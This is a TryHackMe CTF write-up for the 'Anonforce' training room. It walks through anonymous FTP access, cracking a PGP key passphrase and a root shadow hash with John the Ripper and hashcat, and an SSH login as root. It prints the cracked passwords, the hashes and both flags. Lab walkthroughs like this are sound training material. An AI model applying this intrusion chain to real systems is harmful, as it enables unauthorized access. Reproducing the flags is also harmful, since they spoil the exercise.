## Anonforce - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bsidesgtanonforce)

**IP: 10.10.172.195**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, John The Ripper

**Author**: <br>

mauzware aka mauzinho <br>
[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Start with Nmap scan
  ```
  nmap -sC -sV -T5 -p- 10.10.172.195 -> 2 open ports, ssh and ftp
  
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.21.127.185
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 1
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
  | drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
  | drwxr-xr-x   17 0        0            3700 Apr 30 12:01 dev
  | drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
  | drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
  | lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
  | lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
  | drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
  | drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
  | drwx------    2 0        0           16384 Aug 11  2019 lost+found
  | drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
  | drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
  | drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
  | drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
  | dr-xr-xr-x   92 0        0               0 Apr 30 12:01 proc
  | drwx------    3 0        0            4096 Aug 11  2019 root
  | drwxr-xr-x   18 0        0             540 Apr 30 12:01 run
  | drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
  | drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
  | dr-xr-xr-x   13 0        0               0 Apr 30 12:01 sys
  |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
  ```
  
- `notread [NSE: writeable]` looks suspicious, also log in as Anonymous with FTP.

---

## 🧍 User Privilege Escalation

- You can get user flag after logging in with FTP
  ```
  ftp 10.10.172.195
  Anonymous
  no password
  ```
  
- After getting in, look a bit and you'll find the flag `606083fd33beb1284fc51f411a706af8`, I also downloaded it to my Kali.
  ```
  cd home
  cd melodias
  get user.txt

  cat user.txt
  606083fd33beb1284fc51f411a706af8
  ```
  
- Now moving to escalation for root flag.

---

## 👑 Root Privilege Escalation

- When you check `/notread` you'll find 2 files inside: `private.asc` and `backup.pgp`, download them both. `private.asc` is PGP Private Key and `backup.pgp` is encypted file you have to decrypt. Lets work on that!
  
- Will convert `private.asc` to hash and crack it with John and then I will use cracked passphrase to decrypt `backup.pgp`
  ```
  gpg2john private.asc > keyhash.txt
  
  john --wordlist=/home/mauzware/Desktop/rockyou.txt keyhash.txt
  xbox360          (anonforce) 
  
  gpg --import private.asc     
  gpg: /home/mauzware/.gnupg/trustdb.gpg: trustdb created
  gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
  gpg: key B92CD1F280AD82C2: secret key imported
  gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
  gpg: Total number processed: 2
  gpg:               imported: 1
  gpg:              unchanged: 1
  gpg:       secret keys read: 1
  gpg:   secret keys imported: 1
  ```
  
- Awesome, passphrase is `xbox360` use it for both import and decryption. Now let's decrypt `backup.pgp` and check the content.
  ```
  gpg --output decrypted.txt --decrypt backup.pgp 
  gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
  gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
        "anonforce <melodias@anonforce.nsa>"

  cat decrypted.txt
  root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
  daemon:*:17953:0:99999:7:::
  bin:*:17953:0:99999:7:::
  sys:*:17953:0:99999:7:::
  sync:*:17953:0:99999:7:::
  games:*:17953:0:99999:7:::
  man:*:17953:0:99999:7:::
  lp:*:17953:0:99999:7:::
  mail:*:17953:0:99999:7:::
  news:*:17953:0:99999:7:::
  uucp:*:17953:0:99999:7:::
  proxy:*:17953:0:99999:7:::
  www-data:*:17953:0:99999:7:::
  backup:*:17953:0:99999:7:::
  list:*:17953:0:99999:7:::
  irc:*:17953:0:99999:7:::
  gnats:*:17953:0:99999:7:::
  nobody:*:17953:0:99999:7:::
  systemd-timesync:*:17953:0:99999:7:::
  systemd-network:*:17953:0:99999:7:::
  systemd-resolve:*:17953:0:99999:7:::
  systemd-bus-proxy:*:17953:0:99999:7:::
  syslog:*:17953:0:99999:7:::
  _apt:*:17953:0:99999:7:::
  messagebus:*:18120:0:99999:7:::
  uuidd:*:18120:0:99999:7:::
  melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
  sshd:*:18120:0:99999:7:::
  ftp:*:18120:0:99999:7:::
  ```

- Before doing SSH first crack the root hash and that's it, you can log in with SSH as root.
  ```
  echo "$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0" > root.hash
  john --wordlist=/rockyou.txt root.hash
  hikari

  hashcat -m 1800 root.hash /rockyou.txt 
  $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari
  ```

- Let's get the flag, log in with SSH and `cat` the flag.
  ```
  ssh root@10.10.172.195
  hikari

  whoami
  root
  cat /root/root.txt
  f706456440c7af4187810c31c6cebdce
  ```
  
---

## 🏁 Flags

- **User Flag**: `606083fd33beb1284fc51f411a706af8`
- **Root Flag**: `f706456440c7af4187810c31c6cebdce`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Decrypting .pgp file?`

- What did I learn?
  `Just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
